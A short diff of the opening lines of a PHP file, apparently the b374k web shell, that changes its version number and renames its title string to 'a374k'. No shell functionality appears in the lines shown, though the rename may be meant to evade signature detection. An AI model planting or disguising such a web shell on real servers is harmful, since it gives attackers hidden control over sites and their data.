@@ -1,6 +1,6 @@
 <?php
-$GLOBALS['ver'] = "4.0.0";
-$GLOBALS['title'] = "b374k";
+$GLOBALS['ver'] = "4.0.1";
+$GLOBALS['title'] = "a374k";
 
 @ob_start();
 error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
